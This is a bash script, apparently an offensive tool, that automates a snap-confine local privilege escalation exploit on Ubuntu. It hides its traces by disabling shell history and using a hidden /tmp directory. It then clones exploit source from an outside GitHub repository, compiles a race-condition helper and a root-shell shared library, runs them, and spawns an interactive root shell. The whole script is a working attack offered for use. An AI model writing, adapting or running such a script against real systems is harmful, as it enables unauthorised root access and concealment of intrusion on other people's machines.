#!/bin/bash
# backdoor_snapd.sh - Automatic CVE-2026-3888 exploit
# Downloads, compiles and runs the race condition attack

# Configuration
EXPLOIT_REPO="https://github.com/nomaisthere/CVE-2026-3888.git"
WORK_DIR="/tmp/.systemd_hidden_$(date +%s)_$RANDOM"

# Hide traces
export HISTFILE=/dev/null
unset HISTFILE

# Colors (можно убрать)
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

set +e

log() { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
error() { echo -e "${RED}[x]${NC} $1"; }

# Cleanup
cleanup() {
    cd /
    rm -rf "$WORK_DIR" 2>/dev/null
    history -c 2>/dev/null
}
trap cleanup EXIT

# Check if already root
check_root() {
    if [ "$EUID" -eq 0 ]; then
        log "Already root! Spawning shell..."
        /bin/bash -i
        exit 0
    fi
    log "Running as: $(whoami) (UID: $EUID)"
}

# Check snapd version
check_snapd() {
    if ! command -v snap &>/dev/null; then
        error "snapd not installed"
        return 1
    fi
    
    local snap_ver=$(snap version 2>/dev/null | grep "^snapd" | awk '{print $2}')
    log "snapd version: $snap_ver"
    
    # Vulnerable versions: snapd < 2.73+ubuntu24.04.1
    if [[ "$snap_ver" < "2.73" ]]; then
        log "snapd version is VULNERABLE"
        return 0
    else
        warn "snapd may be patched (>= 2.73)"
        return 1
    fi
}

# Check systemd-tmpfiles cleanup timer
check_timer() {
    log "Checking systemd-tmpfiles cleanup schedule..."
    
    if command -v systemctl &>/dev/null; then
        local timer=$(systemctl list-timers systemd-tmpfiles-clean 2>/dev/null | grep -A1 "systemd-tmpfiles-clean" | tail -1 | awk '{print $3}')
        if [ -n "$timer" ]; then
            log "Next cleanup in: $timer"
        else
            warn "Could not determine cleanup schedule"
        fi
    fi
    
    # Ubuntu 24.04 cleans every 30 days, newer versions every 10 days
    . /etc/os-release 2>/dev/null
    if [[ "$VERSION_ID" == "24.04" ]]; then
        log "Ubuntu 24.04 detected: cleanup period is 30 days"
        warn "This exploit may take up to 30 days to trigger!"
    else
        log "Cleanup period is typically 10 days for newer Ubuntu"
    fi
}

# Download and compile exploit
compile_exploit() {
    cd "$WORK_DIR"
    
    # Clone repository
    if command -v git &>/dev/null; then
        git clone --depth 1 "$EXPLOIT_REPO" exploit 2>/dev/null
    else
        error "git not found"
        return 1
    fi
    
    cd exploit/src
    
    # Check for compiler
    if ! command -v gcc &>/dev/null; then
        error "gcc not found"
        return 1
    fi
    
    # Compile the race helper
    log "Compiling firefox_2404.c..."
    gcc -o firefox_2404 firefox_2404.c
    
    if [ ! -f firefox_2404 ]; then
        error "Compilation of firefox_2404 failed"
        return 1
    fi
    
    # Compile the shared library shellcode
    log "Compiling librootshell.so..."
    gcc -o librootshell.so -shared -fPIC librootshell.c
    
    if [ ! -f librootshell.so ]; then
        error "Compilation of librootshell.so failed"
        return 1
    fi
    
    chmod +x firefox_2404
    log "Exploit compiled successfully"
    return 0
}

# Launch the exploit
run_exploit() {
    cd "$WORK_DIR/exploit/src"
    
    log "Launching CVE-2026-3888 exploit..."
    warn "This exploit requires the system to delete /tmp/.snap"
    warn "On Ubuntu 24.04, this takes up to 30 days!"
    warn "The exploit will wait in the background..."
    echo ""
    
    # Run the race condition attack
    ./firefox_2404
    
    local exit_code=$?
    
    if [ $exit_code -eq 0 ]; then
        log "Root shell obtained!"
        return 0
    else
        error "Exploit failed with exit code $exit_code"
        return 1
    fi
}

# Main
main() {
    echo -e "${GREEN}=== CVE-2026-3888 snap-confine LPE Auto-Exploit ===${NC}\n"
    
    check_root
    mkdir -p "$WORK_DIR"
    log "Working dir: $WORK_DIR"
    
    check_snapd || warn "snapd may be patched, but trying anyway..."
    check_timer
    
    compile_exploit || { error "Failed to compile"; exit 1; }
    run_exploit || { error "Exploit failed"; exit 1; }
    
    # If we get here, we have root
    log "Spawning root shell..."
    /bin/bash -i
}

main
